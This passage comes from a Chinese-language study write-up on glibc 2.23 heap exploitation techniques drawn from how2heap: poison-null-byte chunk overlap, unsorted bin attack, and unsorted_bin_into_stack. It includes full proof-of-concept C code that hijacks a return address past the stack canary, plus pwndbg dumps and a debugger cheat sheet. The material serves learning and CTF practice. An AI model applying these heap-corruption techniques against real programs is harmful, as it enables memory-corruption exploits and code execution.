class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-comment">/* consolidate backward */</span><br>  <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>    prevsize = p-&gt;prev_size;<br>    size += prevsize;<br>    p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>    unlink(av, p, bck, fwd);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">Place the chunk in unsorted chunk list. Chunks are</span><br><span class="hljs-comment">not placed into regular bins until after they have</span><br><span class="hljs-comment">been given one chance to be used in malloc.</span><br><span class="hljs-comment">  */</span><br>    [...]<br>  &#125;<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    If the chunk borders the current high end of memory,</span><br><span class="hljs-comment">    consolidate into top</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-keyword">else</span> &#123;<br>    size += nextsize;<br>    set_head(p, size | PREV_INUSE);<br>    av-&gt;top = p;<br>    check_chunk(av, p);<br>  &#125;<br></code></pre></td></tr></table></figure><p>d = malloc(0x300);之后<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622518241999-9ef69691-ef9a-445a-b7af-07e748c8f356.png#clientId=u347f053a-7aac-4&from=paste&height=292&id=u8ac32d1f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=584&originWidth=856&originalType=binary%E2%88%B6=1&size=322110&status=done&style=none&taskId=u180d0ab4-b269-41a1-82ba-b7916de8294&width=428" alt="image.png"><br>返回的地址还是原来 b 的地址（0x8008120-0x10)，刚才没有 free 的 b2 也被包含在了里面<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622518363634-5cd232ab-d33f-4162-a14e-c1880865842b.png#clientId=u347f053a-7aac-4&from=paste&height=221&id=u0df4b579&margin=%5Bobject%20Object%5D&name=image.png&originHeight=441&originWidth=728&originalType=binary%E2%88%B6=1&size=273747&status=done&style=none&taskId=ue4446f69-2c7e-4ee8-84e6-a39289eafa7&width=364" alt="image.png"><br>查看 b2 内容<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622518425460-9b6ca5ed-9ac0-4433-90d3-3e06fb982da4.png#clientId=u347f053a-7aac-4&from=paste&height=402&id=u2001de99&margin=%5Bobject%20Object%5D&name=image.png&originHeight=803&originWidth=1817&originalType=binary%E2%88%B6=1&size=1146578&status=done&style=none&taskId=u0b17fedc-0d1f-4bbb-84a2-a65830e45a9&width=908.5" alt="image.png"><br>该技术适用的场景需要某个 malloc 的内存区域存在一个单字节溢出漏洞。通过溢出下一个 chunk 的 size 字段，攻击者能够在堆中创造出重叠的内存块，从而达到改写其他数据的目的。再结合其他的利用方式，同样能够获得程序的控制权。<br>对于单字节溢出的利用有下面几种：</p><ul><li>扩展被释放块：当溢出块的下一块为被释放块且处于 unsorted bin 中，则通过溢出一个字节来将其大小扩大，下次取得次块时就意味着其后的块将被覆盖而造成进一步的溢出。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">0x100</span>   <span class="hljs-number">0x100</span>    <span class="hljs-number">0x80</span><br>|-------|-------|-------|<br>|   A   |   B   |   C   |   初始状态<br>|-------|-------|-------|<br>|   A   |   B   |   C   |   释放 B<br>|-------|-------|-------|<br>|   A   |   B   |   C   |   溢出 B 的 size 为 <span class="hljs-number">0x180</span><br>|-------|-------|-------|<br>|   A   |   B   |   C   |   <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x180</span><span class="hljs-number">-8</span>)<br>|-------|-------|-------|   C 块被覆盖<br>        |&lt;--实际得到的块-&gt;|<br></code></pre></td></tr></table></figure><ul><li>扩展已分配块：当溢出块的下一块为使用中的块，则需要合理控制溢出的字节，使其被释放时的合并操作能够顺利进行，例如直接加上下一块的大小使其完全被覆盖。下一次分配对应大小时，即可取得已经被扩大的块，并造成进一步溢出。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">0x100</span>   <span class="hljs-number">0x100</span>    <span class="hljs-number">0x80</span><br>|-------|-------|-------|<br>|   A   |   B   |   C   |   初始状态<br>|-------|-------|-------|<br>|   A   |   B   |   C   |   溢出 B 的 size 为 <span class="hljs-number">0x180</span><br>|-------|-------|-------|<br>|   A   |   B   |   C   |   释放 B<br>|-------|-------|-------|<br>|   A   |   B   |   C   |   <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x180</span><span class="hljs-number">-8</span>)<br>|-------|-------|-------|   C 块被覆盖<br>        |&lt;--实际得到的块-&gt;|<br></code></pre></td></tr></table></figure><ul><li>收缩被释放块(即本题)：此情况针对溢出的字节只能为 0 的时候，也就是本节所说的 poison-null-byte，此时将下一个被释放的块大小缩小，如此一来在之后分裂此块时将无法正确更新后一块的 prev_size 字段，导致释放时出现重叠的堆块。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">0x100</span>     <span class="hljs-number">0x210</span>     <span class="hljs-number">0x80</span><br>|-------|---------------|-------|<br>|   A   |       B       |   C   |   初始状态<br>|-------|---------------|-------|<br>|   A   |       B       |   C   |   释放 B<br>|-------|---------------|-------|<br>|   A   |       B       |   C   |   溢出 B 的 size 为 <span class="hljs-number">0x200</span><br>|-------|---------------|-------|   之后的 <span class="hljs-built_in">malloc</span> 操作没有更新 C 的 prev_size<br>         <span class="hljs-number">0x100</span>  <span class="hljs-number">0x80</span><br>|-------|------|-----|--|-------|<br>|   A   |  B1  | B2  |  |   C   |   <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x180</span><span class="hljs-number">-8</span>), <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span><span class="hljs-number">-8</span>)<br>|-------|------|-----|--|-------|<br>|   A   |  B1  | B2  |  |   C   |   释放 B1<br>|-------|------|-----|--|-------|<br>|   A   |  B1  | B2  |  |   C   |   释放 C，C 将与 B1 合并<br>|-------|------|-----|--|-------|<br>|   A   |  B1  | B2  |  |   C   |   <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x180</span><span class="hljs-number">-8</span>)<br>|-------|------|-----|--|-------|   B2 将被覆盖<br>        |&lt;实际得到的块&gt;|<br></code></pre></td></tr></table></figure><h1 id="unsorted-bin-attack-2-23"><a href="#unsorted-bin-attack-2-23" class="headerlink" title="unsorted_bin_attack-2.23"></a>unsorted_bin_attack-2.23</h1><p>这个例程通过 unsortedbin 攻击往栈中写入一个 unsigned long 的值。<br>在实战中，unsorted bin 攻击通常是为更进一步的攻击做准备的。<br>比如，我们在栈上有一个栈单元 stack_var 需要被改写<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622535426079-eb2f090c-5d2b-4a52-aa4f-0b1abcf39af1.png#clientId=u347f053a-7aac-4&from=paste&height=363&id=u7d59295c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=725&originWidth=1261&originalType=binary%E2%88%B6=1&size=1096913&status=done&style=none&taskId=u89bded64-5af6-47f4-924f-79af335cdee&width=630.5" alt="image.png"><br>然后正常地分配一个 chunk。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622535573959-bb4390f8-9b70-4c7c-9804-03800b98dbb3.png#clientId=u347f053a-7aac-4&from=paste&height=382&id=u2ffbb479&margin=%5Bobject%20Object%5D&name=image.png&originHeight=763&originWidth=1317&originalType=binary%E2%88%B6=1&size=1001146&status=done&style=none&taskId=u9f9e017f-e53d-45c3-8392-e81c850ad3d&width=658.5" alt="image.png"><br>再分配一个，防止前一个 chunk 在 free 的时候被合并了。<br>然后 free(p);之后 p 会被插入到 unsortedbin 链表中，它的 fd 和 bk 都指向 unsortedbin 的 head。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622535687040-3198879a-5e40-4b27-a9a6-8a1f68a5de01.png#clientId=u347f053a-7aac-4&from=paste&height=411&id=ue0445c3d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=821&originWidth=1273&originalType=binary%E2%88%B6=1&size=926264&status=done&style=none&taskId=u78523055-0f89-49a0-b52c-064720e5b68&width=636.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622535889873-38f443ff-ab50-4387-a502-0505744b5d59.png#clientId=u347f053a-7aac-4&from=paste&height=203&id=u2f7a2bd4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=405&originWidth=700&originalType=binary%E2%88%B6=1&size=169863&status=done&style=none&taskId=ub7295ae7-dad7-4660-93cc-0a102a030ea&width=350" alt="image.png"><br>接着我们模拟一个漏洞攻击改写 p 的 bk 指针：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622536184807-d0f40425-0e01-42e7-9b63-b891e8b3685a.png#clientId=u347f053a-7aac-4&from=paste&height=311&id=u9296eb09&margin=%5Bobject%20Object%5D&name=image.png&originHeight=622&originWidth=1428&originalType=binary%E2%88%B6=1&size=739966&status=done&style=none&taskId=udf20161b-ffa2-4891-a78c-e634bd5c40b&width=714" alt="image.png"><br>然后 malloc<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622536423282-8f20b15d-fd6b-48af-a2a2-7c268c64c29e.png#clientId=u347f053a-7aac-4&from=paste&height=424&id=ua20c418c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=848&originWidth=1326&originalType=binary%E2%88%B6=1&size=997797&status=done&style=none&taskId=u32fd2ae3-917b-48d2-b75f-4af6bd9b269&width=663" alt="image.png"><br>然后<strong>stack_var</strong>的值就被改写成了 unsortedbin 的 head 的地址了。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622536471263-ce97256d-2443-4eeb-9cba-c8f16ca820df.png#clientId=u347f053a-7aac-4&from=paste&height=31&id=uf7fabbe9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=61&originWidth=461&originalType=binary%E2%88%B6=1&size=19308&status=done&style=none&taskId=uff3920b9-bf5d-41e3-acc8-d4bdc28317d&width=230.5" alt="image.png"><br>之前的 unsafe_unlink 是通过 unlink 来直接控制地址，这里则是通过 unlink 来泄漏 libc 的信息，来进行进一步的攻击。<br>可以参考这一篇：<a href="https://zoepla.github.io/2018/05/how2heap%E7%B3%BB%E5%88%97(%E5%9F%BA%E7%A1%80%E7%AF%87)/">Pwn 的挖坑填坑之旅</a><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622538109096-2e959076-e5a5-4d23-bd96-a531122e0c97.png#clientId=u347f053a-7aac-4&from=paste&height=114&id=ufc44a364&margin=%5Bobject%20Object%5D&name=image.png&originHeight=227&originWidth=1230&originalType=binary%E2%88%B6=1&size=36359&status=done&style=none&taskId=u3dba95ad-3e7f-4983-9930-9ec41b88f5d&width=615" alt="image.png"></p><h1 id="unsorted-bin-into-stack-2-23"><a href="#unsorted-bin-into-stack-2-23" class="headerlink" title="unsorted_bin_into_stack-2.23"></a>unsorted_bin_into_stack-2.23</h1><p>例子源码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">jackpot</span><span class="hljs-params">()</span></span>&#123; <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">intptr_t</span> stack_buffer[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating the victim chunk\n&quot;</span>);<br>        <span class="hljs-keyword">intptr_t</span>* victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n&quot;</span>);<br>        <span class="hljs-keyword">intptr_t</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);<br>        <span class="hljs-built_in">free</span>(victim);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Create a fake chunk on the stack&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);<br>        stack_buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>;<br>        stack_buffer[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">intptr_t</span>)stack_buffer;<br><br>        <span class="hljs-comment">//------------VULNERABILITY-----------</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*S</span><br><span class="hljs-string">IZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\n&quot;</span>);<br>        victim[<span class="hljs-number">-1</span>] = <span class="hljs-number">32</span>;<br>        victim[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">intptr_t</span>)stack_buffer; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br>        <span class="hljs-comment">//------------------------------------</span><br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now next malloc will return the region of our fake chunk: %p\n&quot;</span>, &amp;stack_buffer[<span class="hljs-number">2</span>]);<br>        <span class="hljs-keyword">char</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x100): %p\n&quot;</span>, p2);<br><br>        <span class="hljs-keyword">intptr_t</span> sc = (<span class="hljs-keyword">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br>        <span class="hljs-built_in">memcpy</span>((p2+<span class="hljs-number">40</span>), ≻, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br><br>        assert((<span class="hljs-keyword">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-keyword">long</span>)jackpot);<br>&#125;<br></code></pre></td></tr></table></figure><p>本题 unsorted-bin-into-stack 通过改写 unsorted bin 里 chunk 的 bk 指针到任意地址，从而在栈上 malloc 出 chunk。<br>初始栈<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622792793495-3d896a44-0ef9-41c6-b7f8-1e83072e9644.png#clientId=u38185df4-f4d6-4&from=paste&height=169&id=u10f80e0e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=244&originWidth=857&originalType=binary%E2%88%B6=1&size=239052&status=done&style=none&taskId=u384c129f-04ad-4a88-b95e-d38c2445330&width=593.5" alt="image.png"><br>先 malloc 一个 victim 块<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622792972430-0a6675ef-e922-4622-bdb2-bd18a5f20d01.png#clientId=u38185df4-f4d6-4&from=paste&height=168&id=u4ef9ac2b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=336&originWidth=561&originalType=binary%E2%88%B6=1&size=171711&status=done&style=none&taskId=ucc095613-3559-47fc-acbe-4799fd59cbb&width=280.5" alt="image.png"><br>再分配一个防止 free 的时候和 top chunk 合并。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622793050854-4d51a88c-2d4e-4abc-9fad-cfc16462f8cb.png#clientId=u38185df4-f4d6-4&from=paste&height=219&id=u593caa2a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=437&originWidth=739&originalType=binary%E2%88%B6=1&size=274303&status=done&style=none&taskId=u3d672eb4-d629-46c2-818c-6ed05935421&width=369.5" alt="image.png"><br>接下来释放 p<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622793084517-ac841663-1176-48bc-897a-17b5e6139507.png#clientId=u38185df4-f4d6-4&from=paste&height=246&id=u8713a8b8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=492&originWidth=630&originalType=binary%E2%88%B6=1&size=283418&status=done&style=none&taskId=ufc8a4875-9011-4a1b-90f7-f38cfbfc398&width=315" alt="image.png"><br>可以看到它插入了 unsorted bin 列表中<br>我们要在栈上构造一个 chunk，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">stack_buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span> + <span class="hljs-number">0x10</span>;<br>stack_buffer[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">intptr_t</span>)stack_buffer;<br></code></pre></td></tr></table></figure><p>查看此时内存布局</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">6</span>gx victim - <span class="hljs-number">2</span><br><span class="hljs-number">0x8008010</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000111</span> &lt;-- victim chunk<br><span class="hljs-number">0x8008020</span>:      <span class="hljs-number">0x00007fffff3f3b78</span>      <span class="hljs-number">0x00007fffff3f3b78</span><br><span class="hljs-number">0x8008030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><br>pwndbg&gt; x/<span class="hljs-number">4</span>gx stack_buffer<br><span class="hljs-number">0x7ffffffed9a0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000110</span>  &lt;-- fake chunk<br><span class="hljs-number">0x7ffffffed9b0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00007ffffffed9a0</span><br></code></pre></td></tr></table></figure><p>然后假设有一个漏洞，可以改写 victim chunk 的 bk 指针，那么将其改为指向 fake chunk：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">victim[<span class="hljs-number">-1</span>] = <span class="hljs-number">32</span>;<br>victim[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">intptr_t</span>)stack_buffer; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br></code></pre></td></tr></table></figure><p>这里的 size = 32，只要是一个合理的范围，比之后要申请的 chunk size 要小就行。然后我们把 victim-&gt;bk 的值赋为 stack_buffer</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">6</span>gx victim - <span class="hljs-number">2</span><br><span class="hljs-number">0x8008010</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000020</span>   &lt;-- victim chunk<br><span class="hljs-number">0x8008020</span>:      <span class="hljs-number">0x00007fffff3f3b78</span>      <span class="hljs-number">0x00007ffffffed9a0</span>   &lt;-- bk pointer<br><span class="hljs-number">0x8008030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>那么此时就相当于 fake chunk 已经被链接到 unsorted bin 中。在下一次 malloc 的时候，malloc 会顺着 bk 指针进行遍历，于是就找到了大小正好合适的 fake chunk：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622793793072-91fb3053-b657-414b-9c63-b6aefa287576.png#clientId=u38185df4-f4d6-4&from=paste&height=321&id=uc4f1b5a0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=642&originWidth=1051&originalType=binary%E2%88%B6=1&size=657454&status=done&style=none&taskId=u3fca205b-d8a5-417e-96c2-cd41a462aa2&width=525.5" alt="image.png"><br>过程如下：<br>​</p><p>首先 victim chunk 被从 unsorted bin 中取出：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">bck = victim-&gt;bk;<br><span class="hljs-comment">/* remove from unsorted list */</span><br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><p>显然这个 chunk 的大小是不够的，所以被放入 small bin 中。<br>现在再从 unsorted bin 拿出一个被构造的 fake chunk ，现在有了一些检查：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>    || __builtin_expect (chunksize_nomask (victim)<br>                         &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br></code></pre></td></tr></table></figure><p>大小合理，轻松绕过。而另外值得注意的是 fake chunk 的 fd 指针被修改了，这是 unsorted bin 的地址，通过它可以泄露 libc 地址.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">6</span>gx victim - <span class="hljs-number">2</span><br><span class="hljs-number">0x8008010</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000020</span><br><span class="hljs-number">0x8008020</span>:      <span class="hljs-number">0x00007fffff3f3b88</span>      <span class="hljs-number">0x00007fffff3f3b88</span><br><span class="hljs-number">0x8008030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="Pwngdb"><a href="#Pwngdb" class="headerlink" title="Pwngdb"></a>Pwngdb</h2><p>libc : Print the base address of libc<br>ld : Print the base address of ld<br>codebase : Print the base of code segment<br>heap : Print the base of heap<br>got : Print the Global Offset Table infomation<br>dyn : Print the Dynamic section infomation<br>findcall : Find some function call<br>bcall : Set the breakpoint at some function call<br>tls : Print the thread local storage address<br>at : Attach by process name<br>findsyscall : Find the syscall<br>force : Calculate the nb in the house of force.<br>heapinfo :打印 heap 的一些信息<br>heapinfoall : Print some infomation of heap (all threads)<br>arenainfo : Print some infomation of all arena<br>chunkptr : 打印 chunk 的信息 后面加 chunk 返回给用户的地址<br>printfastbin : 打印 fastbin 的链表信息<br>tracemalloc on : 追踪程序 chunk 的 malloc 和 free<br>parseheap :解析堆的布局<br>magic : 打印出 glibc 中一些有用的信息<br>fp : show FILE structure<br>fp (Address of FILE)</p><h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><p>top_chunk: 显示 top chunk 的信息<br>malloc_chunk address:打印出已被分配的 chunk 的信息<br>fastbins:显示 fastbins 链表信息<br>unsorted:显示 unsortedbin 的信息<br>smallbins:显示 smallbins 的信息<br>largebins:显示 largebins 的信息<br>bins:显示所有 bins 的信息<br>mp：显示一些内存管理用到的全局变量<br>arena：显示分配区的信息</p><h2 id="peda-基础命令"><a href="#peda-基础命令" class="headerlink" title="peda 基础命令"></a>peda 基础命令</h2><p>​</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs cpp">file 路径　-　附加文件<br><span class="hljs-keyword">break</span> *<span class="hljs-number">0x400100</span> (b main) - 在 <span class="hljs-number">0x400100</span> 处下断点<br>tb  - 一次性断点<br>info b - 查看断点信息<br>enable   -   激活断点<br>disable  -   禁用断点<br><span class="hljs-keyword">delete</span> [number]  -  删除断点<br>watch *(<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x08044530</span>  -  在内存<span class="hljs-number">0x0804453</span>处的数据改变时stop<br>p $eax - 输出eax的内容<br><span class="hljs-built_in">set</span> $eax=<span class="hljs-number">4</span> - 修改变量值<br><br>c - 继续运行<br>r - 开始运行<br>ni - 单步步过<br>si - 单步步入<br>fini - 运行至函数刚结束处<br><span class="hljs-keyword">return</span> expression - 将函数返回值指定为expression<br>bt - 查看当前栈帧<br>info f - 查看当前栈帧<br>context - 查看运行上下文<br><span class="hljs-built_in">stack</span> - 查看当前堆栈<br>call func - 强制函数调用<br><span class="hljs-built_in">stack</span> <span class="hljs-number">100</span> - 插件提供的，显示栈中<span class="hljs-number">100</span>项<br>find xxx　 - 快速查找，很实用<br><br>x/&lt;n/f/u&gt; &lt;addr&gt;     n、f、u是可选的参数。<br>x /<span class="hljs-number">4</span>xg $ebp：查看ebp开始的<span class="hljs-number">4</span>个<span class="hljs-number">8</span>字节内容<br>x/wx $esp 　　以<span class="hljs-number">4</span>字节<span class="hljs-number">16</span>进制显示栈中内容<br>b表示单字节，h表示双字节，w表示四字 节，g表示八字节<br>s 按字符串输出<br>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 